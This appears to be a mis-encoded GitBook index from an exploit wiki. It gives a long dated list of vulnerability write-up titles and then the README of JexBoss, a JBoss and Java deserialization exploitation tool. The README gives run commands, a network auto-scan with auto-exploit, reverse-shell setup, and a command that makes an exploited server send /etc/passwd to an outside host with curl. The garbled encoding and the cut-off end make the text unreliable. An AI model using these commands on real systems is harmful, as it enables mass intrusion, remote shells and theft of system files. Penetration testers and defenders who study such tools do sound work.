SQLæ³¨å…¥æ¼æ´ 2021-4-24 ShowDoc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-4-22 Apache Zeppelin æœªæˆæƒä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-22 Hue åå°ç¼–è¾‘å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-21 é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-21 é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-4-21 Linux kernelæƒé™æå‡æ¼æ´ CVE-2021-3493 2021-4-21 ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´ 2021-4-20 è‹¥ä¾ç®¡ç†ç³»ç»Ÿ æœªæˆæƒè®¿é—® 2021-4-20 ä½‘å‹é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-19 Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ è´¦å·å¯†ç æ³„éœ²æ¼æ´ 2021-4-19 é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ æƒé™ç»•è¿‡ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-19 é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ cookie.cgi æƒé™ç»•è¿‡ 2021-4-17 å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ è¶Šæƒè®¿é—®æ¼æ´ 2021-4-14 Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-13 IBOS æ•°æ®åº“æ¨¡å— ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-4-13 Windows Chrome è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-13 SonarQube api ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-27986 2021-4-12 æµªæ½®ClusterEngineV4.0 sysShell ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-12 é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ é»˜è®¤å¼±å£ä»¤æ¼æ´ 2021-4-11 æµªæ½®ClusterEngineV4.0 ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ 2021-4-10 å¥‡å®‰ä¿¡ ç½‘åº·ä¸‹ä¸€ä»£é˜²ç«å¢™ RCE 2021-4-9 ç”¨å‹ERP-NC ç›®å½•éå†æ¼æ´ 2021-4-9 äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-4-9 é½æ²»å ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ 2021-4-9 è‡´è¿œOA Sessionæ³„éœ² ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-4-9 ç”¨å‹ NC XbrlPersistenceServletååºåˆ—åŒ– 2021-4-9 å¤©èä¿¡LDPæœªæˆæƒè®¿é—®æ¼æ´ 2021-4-9 è“å‡ŒOA ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ 2021-4-9 ç”¨å‹ NC ååºåˆ—åŒ–RCEæ¼æ´ 2021-4-9 OneBlog 2021-4-8 æ³›å¾®OA V8 SQLæ³¨å…¥æ¼æ´ 2021-4-8 DzzOffifice 2021-4-8 æ·±ä¿¡æœ SSL VPN å®¢æˆ·ç«¯è¿œç¨‹æ–‡ä»¶ä¸‹è½½ 2021-4-8 é»˜å®‰èœœç½ç®¡ç†å¹³å°æœªæˆæƒé—® 2021-4-8 å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ RCE 2021-4-8 å¤©æ“ å‰å°sqlæ³¨å…¥ 2021-4-8 å¸†è½¯ V9 ä»»æ„æ–‡ä»¶è¦†ç›–æ–‡ä»¶ä¸Šä¼  2021-4-8 æ³›å¾®OA V9 ä»»æ„æ–‡ä»¶ä¸Šä¼  2021-4-8 å¤©æ“ æ•°æ®åº“ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-8 æ³›å¾®OA V9 ä»»æ„æ–‡ä»¶ä¸Šä¼  2021-4-8 å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ RCEæ¼æ´ 2021-4-8 å¤©æ“ å‰å°SQLæ³¨å…¥ 2021-4-6 Jellyfin ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-21402 2021-4-6 å¿«æ’CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-4-6 å¿«æ’CMS ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-6 å¿«æ’CMS åå°XSSæ¼æ´ 2021-4-5 Zyxel NBG2105 èº«ä»½éªŒè¯ç»•è¿‡ CVE-2021-3297 2021-4-4 é”æ·Smartwebç®¡ç†ç³»ç»Ÿ å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-4 é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´ 2021-4-4 é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62437 2021-4-3 Git-LFS è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-27955 2021-4-3 ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-3 PHP zerodiumåé—¨æ¼æ´ 2021-4-3 æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ SQLæ³¨å…¥æ¼æ´ 2021-4-3 æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ åå°XSSæ¼æ´ 2021-4-3 æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´ 2021-4-2 é‡‘å’ŒOA C6 åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´ 2021-4-2 é‡‘å’ŒOA C6 è¶Šæƒä¿¡æ¯æ³„éœ²æ¼æ´ 2021-4-2 é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤ 2021-4-1 æµªæ½®ClusterEngineV4.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-21224 2021-4-1 é€šè¾¾OA v11.9 åå°SQLæ³¨å…¥æ¼æ´ 2021-3-31 ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-31 æœ—è§† TG400 GSM ç½‘å…³ç›®å½•éå† CVE-2021-27328 2021-3-31 VMware vRealize Operations Manager SSRFæ¼æ´ CVE-2021-21975 2021-3-31 DD-WRT UPNPç¼“å†²åŒºæº¢å‡ºæ¼æ´ CVE-2021-27137 2021-3-30 ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´ 2021-3-29 JD-FreeFuck åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-29 æ€ç¦è¿ªå ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ 2021-3-29 OpenSSH å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-15778 2021-3-29 D-Link DCSç³»åˆ—ç›‘æ§ è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-25078 2021-3-25 HIKVISION æµåª’ä½“ç®¡ç†æœåŠ¡å™¨ åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-14544 2021-3-24 è“å‡ŒOA EKP åå°SQLæ³¨å…¥æ¼æ´ CNVD-2021-01363 2021-3-24 Apache OFBiz RMIååºåˆ—åŒ–æ¼æ´ CVE-2021-26295 2021-3-23 è‡´è¿œOA A6 setextno.jsp SQLæ³¨å…¥æ¼æ´ 2021-3-22 MessageSolution é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543 2021-3-21 Jupyter Notebook æœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-21 å¸†è½¯æŠ¥è¡¨ v8.0 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757 2021-3-21 è‡´è¿œOA A8 çŠ¶æ€ç›‘æ§é¡µé¢ä¿¡æ¯æ³„éœ² 2021-3-20 è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´ 2021-3-20 F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-22986 2021-3-19 è‡´è¿œOA A6 getSessionList.jsp Sessionæ³„æ¼æ¼æ´ 2021-3-19 è‡´è¿œOA A6 initDataAssess.jsp ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² 2021-3-18 è‡´è¿œOA A6 DownExcelBeanServlet ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² 2021-3-18 è‡´è¿œOA A6 createMysql.jsp æ•°æ®åº“æ•æ„Ÿä¿¡æ¯æ³„éœ² 2021-3-17 Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-3-17 BSPHP æœªæˆæƒè®¿é—® ä¿¡æ¯æ³„éœ²æ¼æ´ 2021-3-17 Harbor æœªæˆæƒåˆ›å»ºç®¡ç†å‘˜æ¼æ´ CVE-2019-16097 2021-3-17 JCG JHR-N835R åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-17 XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-17 XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°é»˜è®¤å¼±å£ä»¤ 2021-3-17 Sapidoå¤šæ¬¾è·¯ç”±å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-16 æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-3-16 jQuery XSSæ¼æ´ CVE-2020-11022/11023 2021-3-15 Microsoft Exchange è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2021-27065 26857 26858 27065 2021-3-13 Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885 2021-3-11 Git for Visual Studioè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ CVE-2021-21300 2021-3-11 Windows Win32k æœ¬åœ°ææƒæ¼æ´ CVE-2021-1732 2021-3-10 é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«XSSæ¼æ´ 2021-3-10 é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-3-9 GitLab Graphqlé‚®ç®±ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-26413 2021-3-3 1039å®¶æ ¡é€š ä¸‡èƒ½å¯†ç ç»•è¿‡ CNVD-2020-31494 2021-3-3 1039å®¶æ ¡é€š åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2021-3-1 é€šè¾¾OA v11.7 åœ¨çº¿ç”¨æˆ·ç™»å½•æ¼æ´ 2021-3-1 é”æ·SSL VPN è¶Šæƒè®¿é—®æ¼æ´ 2021-2-27 VMware vCenterä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2021-2-22 MinIO SSRFæ¼æ´ CVE-2021-21287 2021-2-21 èœ‚ç½‘äº’è” ä¼ä¸šçº§è·¯ç”±å™¨v4.31 å¯†ç æ³„éœ²æ¼æ´ CVE-2019-16313 2021-2-20 DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-8515 2021-2-19 Weblogic ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2019-2725 2021-2-7 D-Link ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ 2021-2-7 Wayos ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ CNVD-2021-00876 2021-2-7 SaltStack æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-16846/25592 2021-2-7 Saltstack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-11651/11652 2021-2-6 HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½ 2021-2-6 NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åº ä¿¡æ¯æ³„éœ² CVE-2021-1056 2021-2-6 Elasticsearch æœªæˆæƒè®¿é—® 2021-2-6 D-Link DSL-28881A æœªæˆæƒè®¿é—® CVE-2020-24579 2021-2-6 D-Link DSL-28881A ä¿¡æ¯æ³„éœ² CVE-2020-24577 2021-2-6 D-Link DSL-28881A è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-24581 2021-2-6 D-Link DSL-28881A FTPé…ç½®é”™è¯¯ CVE-2020-24578 2021-2-2 Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-202s1-25646 2021-1-31 Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156 2021-1-29 è‹¥ä¾ç®¡ç†ç³»ç»Ÿ åå°ä»»æ„æ–‡ä»¶è¯»å– CNVD-2021-01931 2021-1-28 Atlassian Jira ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-14181 2021-1-26 SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-1-25 è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422 2021-1-25 é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-1-25 Alibaba Nacos æ§åˆ¶å°é»˜è®¤å¼±å£ä»¤ 2021-1-25 Alibaba Nacos æœªæˆæƒè®¿é—®æ¼æ´ 2021-1-24 Apache Kylin Console æ§åˆ¶å°å¼±å£ä»¤ 2021-1-24 Laravel .env é…ç½®æ–‡ä»¶æ³„éœ² CVE-2017-16894 2021-1-23 Weblogic SSRFæ¼æ´ CVE-2014-4210 2021-1-22 Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 2021-1-21 Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254 2021-1-21 OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132 2021-1-21 OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼  2021-1-20 OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 2021-1-18 JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-1-17 Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129 2021-1-16 Apache ActiveMQ Consoleæ§åˆ¶å° å­˜åœ¨é»˜è®¤å¼±å£ä»¤ 2021-1-16 DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995 2021-1-13 Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019 2021-1-11 è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627 2021-1-7 QEMU è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´ CVE-2020-14364 2021-1-7 Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583 2021-1-6 Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519 2021-1-6 Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518 2021-1-5 F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902 2021-1-3 Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´ CVE-2021-3002 2021-1-3 YzmCMS Version å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´ 2021-1-2 Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601 2020-12-24 Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796 2020-12-18 Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼  2020-12-15 JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504 2020-12-12 OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160 2020-12-12 Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715 2020-12-12 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 2020-12-11 Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935 2020-12-9 Discuz!X å°äº3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´ 2020-12-8 Redis å°äº5.0.5 ä¸»ä»å¤åˆ¶ RCE 2020-12-9 é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½• 2020-12-7 é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2020-12-7 é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE 2020-12-7 é€šè¾¾OA v11.7åå°SQLæ³¨å…¥ 2020-12-6 è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´ 2020-12-5 æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204 2020-12-5 æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´ 2020-12-5 æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥ 2020-12-5 æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å– 2020-11-26 å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´ 2020-11-26 é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ 2020-11-26 ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ 2020-11-24 ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923 2020-11-22 ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2020-11-22 ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ 2020-11-21 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 2020-11-19 Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596 2020-11-20 Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  2020-11-19 åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ 2020-11-18 Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209 2020-11-17 å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´ 2020-11-17 å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™† 2020-11-17 é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ² 2020-11-14 CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452 2020-11-13 æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552 2020-11-13 æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´ 2020-11-13 TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 2020-11-13 å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´ 2020-11-12 ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552 2020-11-12 ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325 2020-11-11 Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759 2020-11-11 Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529 2020-11-11 Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271 2020-11-9 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925 2020-11-8 Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615 2020-11-8 Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991 2020-11-8 Apache Shiro å°äº1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437 2020-11-7 Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ² 2020-11-7 Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 2020-11-7 Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 2020-11-7 Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 2020-11-7 Apache Solr XXE æ¼æ´ CVE-2017-12629 2020-11-7 Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 2020-11-7 æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS 2020-11-7 æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥ 2020-11-7 æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼  PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-07-04 17:40:55 "},"KONGTIAO.html":{"url":"KONGTIAO.html","title":"ä¾¿æºå°ç©ºè°ƒ","keywords":"","body":" PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-11 18:18:37 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/","title":"WebæœåŠ¡å™¨æ¼æ´","keywords":"","body":"WebæœåŠ¡å™¨æ¼æ´ğŸ¦” PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/","title":"Jboss","keywords":"","body":"Jboss PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-15 09:55:48 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· Jexboss PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-15 11:57:53 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/æ‰«æå·¥å…· Jexboss.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/æ‰«æå·¥å…· Jexboss.html","title":"æ‰«æå·¥å…· Jexboss","keywords":"","body":"JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc. Requirements Python >= 2.7.x urllib3 ipaddress Installation on Linux\\Mac To install the latest version of JexBoss, please use the following commands: git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 OR: Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip unzip master.zip cd jexboss-master pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 If you are using CentOS with Python 2.6, please install Python2.7. Installation example of the Python 2.7 on CentOS using Collections Software scl: yum -y install centos-release-scl yum -y install python27 scl enable python27 bash Installation on Windows If you are using Windows, you can use the Git Bash to run the JexBoss. Follow the steps below: Download and install Python Download and install Git for Windows After installing, run the Git for Windows and type the following commands: PATH=$PATH:C:\\Python27\\ PATH=$PATH:C:\\Python27\\Scripts git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 Features The tool and exploits were developed and tested for: JBoss Application Server versions: 3, 4, 5 and 6. Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc) The exploitation vectors are: /admin-console tested and working in JBoss versions 5 and 6 /jmx-console tested and working in JBoss versions 4, 5 and 6 /web-console/Invoker tested and working in JBoss versions 4, 5 and 6 /invoker/JMXInvokerServlet tested and working in JBoss versions 4, 5 and 6 Application Deserialization tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters Servlet Deserialization tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an \"Invoker\" in a link) Apache Struts2 CVE-2017-5638 tested in Apache Struts 2 applications Others Videos Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss Exploiting JBoss Application Server with JexBoss Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638) Screenshots Simple usage examples: $ python jexboss.py Example of standalone mode against JBoss: $ python jexboss.py -u http://192.168.0.26:8080 Usage modes: $ python jexboss.py -h Network scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt Network scan with auto-exploit mode: $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt Results and recommendations: Reverse Shell (meterpreter integration) After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command: jexremote=YOUR_IP:YOUR_PORT Example: Shell>jexremote=192.168.0.10:4444 Example: When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute. Usage examples For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server: $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server' For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host): $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name For Java Deserialization Vulnerabilities in a Servlet (like Invoker): $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize For Apache Struts 2 (CVE-2017-5638) $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\" Auto scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log File scan mode: $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log More Options: optional arguments: -h, --help show this help message and exit --version show program's version number and exit --auto-exploit, -A Send exploit code 